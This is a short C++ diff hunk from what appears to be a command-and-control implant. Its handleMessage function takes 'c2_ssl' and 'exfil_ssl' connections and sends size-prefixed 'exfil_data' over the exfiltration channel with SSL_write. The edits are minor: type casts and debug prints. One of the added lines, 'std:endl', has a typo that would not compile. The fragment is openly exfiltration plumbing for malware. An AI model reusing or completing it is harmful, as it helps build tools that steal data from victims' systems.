@@ -170,11 +170,14 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
 
         char* size_bytes = reinterpret_cast<char*>(&payload_size);
         buffer.insert(buffer.end(), size_bytes, size_bytes + 4);
-        buffer.insert(buffer.end(), exfil_data.begin(), exfil_data.end());
+        buffer.insert(buffer.end(), exfil_data.data(), exfil_data.data() + exfil_data.size());
 
         //send_all_ssl(exfil_ssl, buffer.data(), buffer.size());
+        std::cout << "Point A" << std::endl;
 
-        SSL_write(exfil_ssl, buffer.data(), buffer.size());
+        SSL_write(exfil_ssl, buffer.data(), static_cast<int>(buffer.size()));
+    
+        std::cout << "Point B" << std:endl;
     }
 }
 
